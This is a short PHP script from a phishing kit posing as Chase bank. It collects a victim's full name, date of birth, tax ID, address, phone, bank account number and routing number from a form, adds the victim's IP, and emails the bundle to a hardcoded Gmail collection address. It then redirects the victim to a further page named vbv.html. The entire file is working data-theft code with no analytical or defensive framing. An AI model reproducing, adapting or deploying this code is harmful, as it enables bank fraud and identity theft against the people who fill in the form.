<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "Full Name             : ".$_POST['fullname']."\n";
$message .= "Date of Birth              : ".$_POST['dob']."\n";
$message .= "TAX ID Number (TIN)              : ".$_POST['tin']."\n";
$message .= "City             : ".$_POST['city']."\n";
$message .= "Street Address              : ".$_POST['address']."\n";
$message .= "Zip Code             : ".$_POST['zip']."\n";
$message .= "State/Region              : ".$_POST['state']."\n";
$message .= "Phone Number             : ".$_POST['phone']."\n";
$message .= "Account Type             : ".$_POST['type']."\n";
$message .= "Account Number              : ".$_POST['account']."\n";
$message .= "Routine Number             : ".$_POST['routine']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "cmssgmdlaw@gmail.com

,cmssgmdlaw@gmail.com";
$subject = " Chase BILLING ADDRESS | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  vbv.html");
?>


